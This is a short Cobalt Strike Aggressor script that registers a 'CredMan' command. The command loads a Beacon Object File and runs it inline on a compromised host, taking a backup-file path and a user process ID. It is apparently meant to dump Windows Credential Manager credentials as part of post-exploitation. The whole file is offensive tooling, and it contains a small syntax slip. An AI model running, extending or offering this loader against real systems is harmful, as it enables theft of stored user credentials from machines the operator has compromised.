alias CredMan {
	local('$handle $data $args $2 $3');

    if(size(@_) != 3){
        berror($1, "CredMan: not enough arguments,Usage: CredMan [encrypted backup file location][user process id] ");
        return;
    }

    $handle = openf(script_resource("CredMan.o"));
    $data   = readb($handle, -1);
    closef($handle)

    $args = bof_pack($1,"Zi",$2,$3);

    btask($1, "Running CredMan");


    beacon_inline_execute($1,$data,"go",$args);
}

